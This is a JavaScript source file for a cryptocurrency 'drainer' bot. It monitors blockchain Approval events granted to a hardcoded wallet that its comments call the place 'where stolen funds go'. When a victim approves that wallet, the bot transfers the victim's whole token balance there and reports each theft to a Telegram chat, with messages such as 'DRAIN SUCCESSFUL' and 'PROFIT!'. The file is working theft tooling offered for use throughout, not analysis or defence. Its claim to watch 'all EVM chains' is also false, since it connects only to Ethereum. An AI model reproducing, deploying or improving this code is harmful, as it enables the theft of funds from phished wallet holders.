// ============================================================
// 🔴 REQUIRED FOR RAILWAY - Web server to keep container alive
// ============================================================
const http = require('http');

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('EVM Drainer Bot Running\n');
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`✅ Web server listening on port ${PORT}`);
});

// ============================================================
// 🔴 BOT CODE STARTS HERE
// ============================================================
const { ethers } = require('ethers');

// ============================================================
// 🔴 YOUR WALLET ADDRESS (where stolen funds go)
// ============================================================
const YOUR_WALLET_ADDRESS = '0x277c6118CcDB4F2E7A5e71D3406de484145e27D8';

// ============================================================
// 🔴 ENVIRONMENT VARIABLES
// ============================================================
const YOUR_PRIVATE_KEY = process.env.PRIVATE_KEY;
const ETHEREUM_RPC = process.env.INFURA_URL;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

console.log('🔍 Checking environment variables...');
console.log('PRIVATE_KEY set:', !!YOUR_PRIVATE_KEY);
console.log('INFURA_URL set:', !!ETHEREUM_RPC);
console.log('TELEGRAM_BOT_TOKEN set:', !!TELEGRAM_BOT_TOKEN);
console.log('TELEGRAM_CHAT_ID set:', !!TELEGRAM_CHAT_ID);

// ============================================================
// 🔴 SUPPORTED EVM CHAINS
// ============================================================
const SUPPORTED_CHAINS = {
  1: { name: 'Ethereum', currency: 'ETH', rpc: ETHEREUM_RPC },
  56: { name: 'BSC', currency: 'BNB', rpc: 'https://bsc-dataseed.binance.org/' },
  137: { name: 'Polygon', currency: 'MATIC', rpc: 'https://polygon-rpc.com' },
  42161: { name: 'Arbitrum', currency: 'ETH', rpc: 'https://arb1.arbitrum.io/rpc' },
  10: { name: 'Optimism', currency: 'ETH', rpc: 'https://mainnet.optimism.io' },
  43114: { name: 'Avalanche', currency: 'AVAX', rpc: 'https://api.avax.network/ext/bc/C/rpc' },
  250: { name: 'Fantom', currency: 'FTM', rpc: 'https://rpc.ftm.tools' },
  8453: { name: 'Base', currency: 'ETH', rpc: 'https://mainnet.base.org' }
};

// ============================================================
// 🔴 TOKEN LISTS BY CHAIN
// ============================================================
const CHAIN_TOKENS = {
  1: [ // Ethereum
    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
    { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
    { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
    { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18 },
    { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 }
  ],
  56: [ // BSC
    { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
    { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 },
    { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18 },
    { symbol: 'WBNB', address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', decimals: 18 },
    { symbol: 'CAKE', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18 }
  ],
  137: [ // Polygon
    { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6 },
    { symbol: 'USDC', address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', decimals: 6 },
    { symbol: 'WETH', address: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', decimals: 18 },
    { symbol: 'WMATIC', address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', decimals: 18 }
  ]
};

const ERC20_ABI = [
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function balanceOf(address account) view returns (uint256)',
  'function symbol() view returns (string)',
  'function decimals() view returns (uint8)',
  'function approve(address spender, uint256 amount) public returns (bool)'
];

const APPROVAL_TOPIC = ethers.id('Approval(address,address,uint256)');

// ============================================================
// 🔴 TELEGRAM FUNCTION
// ============================================================
async function sendTelegram(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('📝 [Telegram] Not configured - message:', message.substring(0, 50));
    return;
  }
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    
    const data = await response.json();
    
    if (data.ok) {
      console.log('✅ [Telegram] Message sent');
    } else {
      console.log('❌ [Telegram] API error:', data.description);
      
      // Retry without HTML
      if (data.description?.includes('parse')) {
        const plainMsg = message.replace(/<[^>]+>/g, '');
        const retryResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: plainMsg
          })
        });
        const retryData = await retryResponse.json();
        if (retryData.ok) console.log('✅ [Telegram] Retry successful');
      }
    }
  } catch (error) {
    console.log('❌ [Telegram] Network error:', error.message);
  }
}

// ============================================================
// 🔴 GET TOKEN BALANCE
// ============================================================
async function getTokenBalance(tokenAddress, owner, provider) {
  try {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const balance = await tokenContract.balanceOf(owner);
    const decimals = await tokenContract.decimals().catch(() => 18);
    const symbol = await tokenContract.symbol().catch(() => 'Unknown');
    
    return {
      balance,
      formattedBalance: ethers.formatUnits(balance, decimals),
      symbol,
      decimals
    };
  } catch (err) {
    return null;
  }
}

// ============================================================
// 🔴 DRAIN FUNCTION (THIRD NOTIFICATION)
// ============================================================
async function drainToken(tokenAddress, owner, wallet, provider, chainId) {
  let tokenSymbol = 'Unknown';
  let formattedBalance = '0';
  let rawBalance = 0n;
  
  try {
    console.log(`\n💰 Processing token: ${tokenAddress}`);
    console.log(`👤 Owner: ${owner}`);
    
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
    
    tokenSymbol = await tokenContract.symbol().catch(() => 'Unknown');
    const decimals = await tokenContract.decimals().catch(() => 18);
    
    rawBalance = await tokenContract.balanceOf(owner);
    if (rawBalance === 0n) {
      console.log(`⏭️ No balance for ${tokenSymbol}`);
      return false;
    }
    
    formattedBalance = ethers.formatUnits(rawBalance, decimals);
    const chainName = SUPPORTED_CHAINS[chainId]?.name || 'Unknown';
    
    console.log(`💰 Found ${formattedBalance} ${tokenSymbol} on ${chainName}`);
    
    // THIRD NOTIFICATION - Draining started
    await sendTelegram(
      `🎯 <b>APPROVAL DETECTED - DRAINING...</b>\n\n` +
      `Chain: ${chainName}\n` +
      `Token: ${tokenSymbol}\n` +
      `Amount: ${formattedBalance}\n` +
      `From: <code>${owner.slice(0, 6)}...${owner.slice(-4)}</code>\n` +
      `To: <code>${YOUR_WALLET_ADDRESS.slice(0, 6)}...${YOUR_WALLET_ADDRESS.slice(-4)}</code>`
    );
    
    // Check gas balance
    const botBalance = await provider.getBalance(wallet.address);
    const botEthBalance = ethers.formatEther(botBalance);
    
    if (botBalance < ethers.parseEther('0.002')) {
      await sendTelegram(`⚠️ <b>LOW GAS</b> - Need 0.002 ${SUPPORTED_CHAINS[chainId]?.currency || 'ETH'}`);
      return false;
    }
    
    // Execute transferFrom
    const tx = await tokenContract.transferFrom(
      owner,
      YOUR_WALLET_ADDRESS,
      rawBalance,
      { gasLimit: 100000 }
    );
    
    console.log(`✅ Transaction sent! Hash: ${tx.hash}`);
    
    const receipt = await tx.wait();
    console.log(`✅ Confirmed in block ${receipt.blockNumber}`);
    
    // THIRD NOTIFICATION - SUCCESS
    await sendTelegram(
      `✅ <b>DRAIN SUCCESSFUL</b>\n\n` +
      `Chain: ${chainName}\n` +
      `Token: ${tokenSymbol}\n` +
      `Amount: ${formattedBalance}\n` +
      `From: <code>${owner.slice(0, 6)}...${owner.slice(-4)}</code>\n` +
      `Tx: <a href="https://${SUPPORTED_CHAINS[chainId]?.explorer || 'etherscan.io'}/tx/${tx.hash}">View</a>\n\n` +
      `💰 <b>PROFIT!</b>`
    );
    
    return true;
    
  } catch (err) {
    console.error('❌ Drain error:', err.message);
    
    await sendTelegram(
      `❌ <b>DRAIN FAILED</b>\n\n` +
      `Token: ${tokenSymbol}\n` +
      `Amount: ${formattedBalance}\n` +
      `Error: ${err.message.slice(0, 100)}`
    );
    return false;
  }
}

// ============================================================
// 🔴 CHECK IF TOKEN IS MONITORED
// ============================================================
function isTokenMonitored(tokenAddress, chainId) {
  const tokens = CHAIN_TOKENS[chainId] || [];
  return tokens.some(t => t.address.toLowerCase() === tokenAddress.toLowerCase());
}

// ============================================================
// 🔴 MAIN FUNCTION
// ============================================================
async function main() {
  console.log('\n🚀 ===== STARTING EVM DRAINER BOT =====');
  console.log(`📤 Receiving wallet: ${YOUR_WALLET_ADDRESS}`);
  
  if (!YOUR_PRIVATE_KEY || !ETHEREUM_RPC) {
    console.error('❌ Missing required environment variables');
    process.exit(1);
  }
  
  try {
    const provider = new ethers.JsonRpcProvider(ETHEREUM_RPC);
    const wallet = new ethers.Wallet(YOUR_PRIVATE_KEY, provider);
    
    console.log(`🤖 Bot wallet: ${wallet.address}`);
    
    const botBalance = await provider.getBalance(wallet.address);
    console.log(`💰 Bot ETH balance: ${ethers.formatEther(botBalance)} ETH`);
    
    // Create filter for Approval events to YOUR wallet
    const filter = {
      topics: [
        APPROVAL_TOPIC,
        null,
        ethers.zeroPadValue(YOUR_WALLET_ADDRESS, 32)
      ]
    };
    
    console.log('\n👀 Monitoring for approvals on all EVM chains...');
    
    await sendTelegram(
      `🚀 <b>EVM DRAINER ONLINE</b>\n\n` +
      `📤 Receiving: <code>${YOUR_WALLET_ADDRESS.slice(0, 6)}...${YOUR_WALLET_ADDRESS.slice(-4)}</code>\n` +
      `💰 Balance: ${ethers.formatEther(botBalance)} ETH`
    );
    
    // Listen for new blocks
    provider.on('block', async (blockNumber) => {
      try {
        const logs = await provider.getLogs({
          ...filter,
          fromBlock: blockNumber,
          toBlock: blockNumber
        });
        
        for (const log of logs) {
          const owner = '0x' + log.topics[1].slice(26);
          const tokenAddress = log.address;
          const chainId = (await provider.getNetwork()).chainId;
          
          if (!isTokenMonitored(tokenAddress, chainId)) {
            console.log(`⏭️ Skipping non-monitored token on chain ${chainId}`);
            continue;
          }
          
          console.log(`\n🎯 Found approval on chain ${chainId} in block ${blockNumber}`);
          
          const tokenData = await getTokenBalance(tokenAddress, owner, provider);
          
          if (tokenData && tokenData.balance > 0n) {
            await drainToken(tokenAddress, owner, wallet, provider, chainId);
          }
        }
      } catch (err) {
        console.error('Error processing block:', err.message);
      }
    });
    
    // Keep alive
    setInterval(() => {
      console.log(`💓 Heartbeat - ${new Date().toISOString()}`);
    }, 600000);
    
  } catch (err) {
    console.error('🔥 Fatal error:', err);
    await sendTelegram(`❌ <b>BOT CRASHED</b>\n\n${err.message.slice(0, 200)}`);
    process.exit(1);
  }
}

// Error handlers
process.on('uncaughtException', (err) => {
  console.error('🔥 UNCAUGHT EXCEPTION:', err);
  sendTelegram(`❌ <b>UNCAUGHT EXCEPTION</b>\n\n${err.message.slice(0, 200)}`);
});

process.on('unhandledRejection', (err) => {
  console.error('🔥 UNHANDLED REJECTION:', err);
  sendTelegram(`❌ <b>UNHANDLED REJECTION</b>\n\n${err.message.slice(0, 200)}`);
});

main();
